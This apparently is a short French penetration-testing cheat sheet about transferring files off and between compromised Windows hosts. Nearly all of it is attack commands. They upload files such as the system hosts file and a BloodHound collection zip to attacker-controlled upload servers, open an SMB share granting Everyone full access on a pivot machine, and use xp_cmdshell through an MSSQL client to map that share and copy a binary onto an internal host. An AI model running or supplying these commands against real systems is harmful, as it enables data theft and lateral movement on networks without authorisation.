# cas standard
### Démarrage du serveur Python permettant d'uploader des fichiers
```powershell
python3 -m http.uploadserver 80  
```

### Chargement du module
```powershell
import-module . .\PSUpload.ps1   
```

### Upload fichier
Avec PSUpload.ps1 : https://shuciran.github.io/posts/Upload-Server-Python/
```
PS> . .\PSUpload.ps1
PS> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts   
```

Directement :
```
$resp = $wc.UploadFile("http://192.168.45.155:8000/upload",".\20250330050331_BloodHound.zip")
```

# Cas avec une machine interne n'ayant pas d'accès à l'extérieur
### Creation d'un SMB à l'intérieur de la machine ayant accès à l'extérieur

MS02 n'a pas accès à Kali directement.
On va activer un partage sur MS01 puis transférer le programme sur MSO2 :
```
net share Myshare=c:\Users\eric.wallows /GRANT:Everyone,FULL

icacls "C:\Users\eric.wallows\sp.exe" /grant Everyone:R

icacls "C:\Users\eric.wallows" /grant Everyone:RX

```

### Activation d'un lecteur Z sur MS02 pointant sur le partage de MS01
exemple si on utilise impacket-mssqlclient :
```
EXEC xp_cmdshell 'net use Z: \\10.10.187.147\Myshare';

```

#### Téléchargement 
exemple si on utilise impacket-mssqlclient :
```
EXEC xp_cmdshell 'copy Z:\sp.exe C:\Users\Public\sp.exe';
```
